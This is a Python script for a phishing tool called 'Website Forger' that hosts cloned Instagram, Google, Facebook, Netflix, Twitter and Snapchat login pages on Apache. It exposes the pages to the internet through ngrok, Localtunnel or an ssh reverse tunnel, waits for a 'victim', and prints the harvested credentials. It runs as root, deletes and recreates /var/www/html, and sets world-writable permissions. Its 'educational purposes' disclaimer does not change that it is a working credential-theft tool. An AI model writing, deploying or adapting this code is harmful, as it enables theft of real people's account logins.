#!/usr/bin/env python3



#################################################################
##                                                             ##
## Website Forger                   v1.0 on BETA (Development) ##
##                                       www.thehiddenbyte.com ##
##                                                             ##
##                                                             ##
## For educational and/or ethical purposes                     ##
## Based on the open source BlackPish project                  ##
## We are not responsible for misuse                           ##
##                                                             ##
#################################################################



# Libraries #
from os import system, getcwd, geteuid
from time import sleep
from socket import create_connection, gethostname, gethostbyname
from distutils import dir_util
from sys import version_info



# Variables #
cwd = getcwd() # Gets working directory #

localip = gethostbyname(gethostname()) # Get local IP #



# COLORS #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"



# Check for python version #
if version_info < (3,0,0):
    exit(red + "[!] Please use python3: sudo python3 webfor.py" + reset)

# Check for root #
if geteuid() != 0:
    exit(red + "[!] Please run as root" + reset)



def warning(): # Banner #
    print('''
\033[94;1m         _    _        _           _  _          \033[93;1m ______                                 
\033[94;1m        | |  | |      | |         (_)| |         \033[93;1m |  ___|                                
\033[94;1m        | |  | |  ___ | |__   ___  _ | |_   ___  \033[93;1m | |_     ___   _ __   __ _   ___  _ __ 
\033[94;1m        | |/\| | / _ \| '_ \ / __|| || __| / _ \ \033[93;1m |  _|   / _ \ | '__| / _` | / _ \| '__|
\033[94;1m        \  /\  /|  __/| |_) |\__ \| || |_ |  __/ \033[93;1m | |    | (_) || |   | (_| ||  __/| |   
\033[94;1m         \/  \/  \___||_.__/ |___/|_| \__| \___| \033[93;1m \_|     \___/ |_|    \__, | \___||_|   
\033[94;1m                                                 \033[93;1m                       __/ |            
\033[94;1m                                                 \033[93;1m                      |___/ 


\033[97;1m             This application has been developed by The Hidden Byte security team,
\033[97;1m             you can find more detailed information about the developers on their
\033[97;1m             web portal. The use of this application is for ethical and/or educational
\033[97;1m             purposes and we are not responsible for any use that is made of this
\033[97;1m             application, you act at your own risk and assume the risks of using
\033[97;1m             this application for other purposes.
                        
\033[97;1m             Information >    \033[92;1mhttps://www.thehiddenbyte.com
\033[97;1m             Version     >    \033[92;1mv1.0 BETA (Development)

\033[97;1m             Category    >    \033[92;1mWebsite / MITM spoofing
\033[97;1m             Developer   >    \033[92;1mSardi
 ''')
    print('\n')
    warningchoice = input("             \033[93;1mDo you agree to use the program at your own risk?: \033[94;1m(y/n) ") # Agreement Message #

    if warningchoice == 'y':
        pass
    elif warningchoice == 'yes':
	    pass
    elif warningchoice == 'Y':
        pass
    elif warningchoice == 'Yes':
	    pass
    else:
        endMessage()



def checkInternet(): # Checks for internet connection #
    print(yellow + "[*] Checking connection...")
    try:
        create_connection(("www.apple.com", 80)) # Tries to connect to google.com #
        print(blue + "[+] Internet found")
        sleep(2)
    except OSError: # Checks for OSError #
        print(red + "[!] Internet not found" + reset)
        exit(0)



def setup(template): # Template for input #
    print('\n')
    print(red + '           [1]' + blue + ' ngrok (recommended)')
    print(red + '           [2]' + blue + ' Localtunnel')
    print(red + '           [3]' + blue + ' localhost.run')
    print(red + '           [4]' + blue + ' Localhost only\n\n')
    choice1 = input(yellow + "        [" + blue + f"Website Forger-{template}" + yellow + "] -> ")

    # Setup #
    if choice1 == '1':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
        dir_util.copy_tree(f"Websites/{template}", "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
        print(green + '[+] Copying to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')  # Starts apache2 service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(blue + "\nLocal: " + red + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + '[*] Starting ngrok')
        ngrokForward()  # ngrok port forward #
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:  # Waits for content on usernames.txt #
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    elif choice1 == '2':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
        dir_util.copy_tree(f"Websites/{template}", "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
        print(green + '[+] Copying to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')  # Starts apache2 service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + '[*] Starting Localtunnel')
        localTunnel()  # Localtunnel port forward #
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:  # Waits for content on usernames.txt #
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    elif choice1 == '3':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
        dir_util.copy_tree(f"Websites/{template}", "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
        print(green + '[+] Copying to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')  # Starts apache2 service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + '[*] Starting Localhost.run')
        localhost()  # Localhost.run port forward #
        while True:  # Waits for content on usernames.txt #
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    elif choice1 == '4':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
        dir_util.copy_tree(f"Websites/{template}", "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
        print(green + '[+] Copying to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')  # Starts apache2 service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:  # Waits for content on usernames.txt #
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    else:
        print(red + '[!] Invalid Option')
        sleep(1)
        main()


# Port forward to ngrok #
def ngrokForward():
    sleep(2)
    try:
        system(f"cd {cwd} && ./ngrok http 80")
    except:
        print(red + "\n[!] Something went wrong! Please try again")
        endMessage()



# Port forward with Localtunnel #
def localTunnel():
    name = input(yellow + "\nCustom Domain Name(don't need www. or domain extension): ")
    port = input(yellow + "\nPort[recommended 8080]: ")
    print(yellow + '\n If prompt about RSA key, say yes' + green)
    sleep(2)
    system('lt -p ' + port + ' -s ' + name + ' --allow-invalid-cert --print-requests')



# Port forward with localhost.run #
def localhost():
    print(yellow + ' If prompt about RSA key, say yes' + green)
    sleep(2)
    system('ssh -R 8080:localhost:8080 ssh.localhost.run')



# Redirect Prompt #
def redirect():
    redirect = input(yellow + "URL redirect to: ")
    if 'http://' in redirect or 'https://' in redirect:
        with open('Server/www/login.php') as f:
            read = f.read()
        r = read.replace('<REDIRECT>', redirect)
        w = open('Server/www/login.php', 'w')
        w.write(r)
        w.close()
    
    else:
        redirect = 'https://' + redirect
        with open('Server/www/login.php') as f:
            read = f.read()
        r = read.replace('<REDIRECT>', redirect)
        w = open('Server/www/login.php', 'w')
        w.write(r)
        w.close()



# Banner #
def banner():
    print('''
\033[94;1m         _    _        _           _  _          \033[93;1m ______                                 
\033[94;1m        | |  | |      | |         (_)| |         \033[93;1m |  ___|                                
\033[94;1m        | |  | |  ___ | |__   ___  _ | |_   ___  \033[93;1m | |_     ___   _ __   __ _   ___  _ __ 
\033[94;1m        | |/\| | / _ \| '_ \ / __|| || __| / _ \ \033[93;1m |  _|   / _ \ | '__| / _` | / _ \| '__|
\033[94;1m        \  /\  /|  __/| |_) |\__ \| || |_ |  __/ \033[93;1m | |    | (_) || |   | (_| ||  __/| |   
\033[94;1m         \/  \/  \___||_.__/ |___/|_| \__| \___| \033[93;1m \_|     \___/ |_|    \__, | \___||_|   
\033[94;1m                                                 \033[93;1m                       __/ |            
\033[94;1m                                                 \033[93;1m                      |___/ 

\033[97;1m                   Currently running: v1.0 BETA || Development version
\033[97;1m                      Check more info on GitHub or our repository

\033[97;1m                                   [Websites list]
                    
                            \033[92;1m[1]\033[97;1m Instagram \033[91;1m      \033[92;1m[4]\033[97;1m Netflix \033[91;1m
                            \033[92;1m[2]\033[97;1m Google \033[91;1m         \033[92;1m[5]\033[97;1m Twitter \033[91;1m
                            \033[92;1m[3]\033[97;1m Facebook \033[91;1m       \033[92;1m[6]\033[97;1m Snapchat \033[91;1m
                                    
                            [0]\033[93;1m Clean \033[91;1m          [x]\033[93;1m Exit
        \033[0m''')


    
def endMessage(): # Message when you exit #
    print("\n")
    print(yellow + "  If you have any problems while using " + blue + "Website Forger " + yellow + "please report it to us\n")
    print(yellow + "  Also you can contact us, check the README.md file on the path\n")
    print("\n" + reset)
    exit(0)



# Main Script #
def main():

    system("clear") # clear screen #

    checkInternet() # Check internet connection #

    warning() # Agree to use with responsibily #

    system('clear') # clear screen #

    banner() # Load Banner #

    choice = input(yellow + "        [" + blue + "Website Forger" + yellow + "] -> ") # Get user input #



    # Instagram #
    if choice == "1":
        setup("Instagram")

    # Google #
    elif choice == '2':
        setup("Google")

    # Facebook #
    elif choice == '3':
        setup("Facebook")

    # Netflix #
    elif choice == '4':
        setup("Netflix")

    # Twitter #
    elif choice == "5":
        setup("Twitter")
    
    # Snapchat #
    elif choice == "6":
        setup("Snapchat")



    # Clean out everything #
    elif choice == "0":
        print(green + '[+] Stopping Apache2 Service')
        system('service apache2 stop') # Stops apache2 service #
        print(green + '[+] Stopping Traffic forwarding to ngrok')
        system('pkill -f ngrok') # Stops ngrok #
        print(green + '[+] Cleaning /var/www/html/')
        system('rm -r /var/www/html/ && mkdir /var/www/html') # Removes and makes /var/www/html #
        print(green + '[+] Cleaning /Server/www/')
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes and makes /Server/www #
        print(green + '[+] Done')
        main()



    # Exit #
    elif choice == 'x':
        endMessage()



    # Invalid Option Error #
    else:
        print(red + "[!] Invalid option" + reset)
        main()



# This will start the script #
try:
    if __name__ == '__main__':
        main()

# Will detect if they exit #
except KeyboardInterrupt:
    print("\n")
    print(red + "[!] Operation interrupted by keyboard command")
    print(red + "[!] Exiting" + reset)
    exit(0)
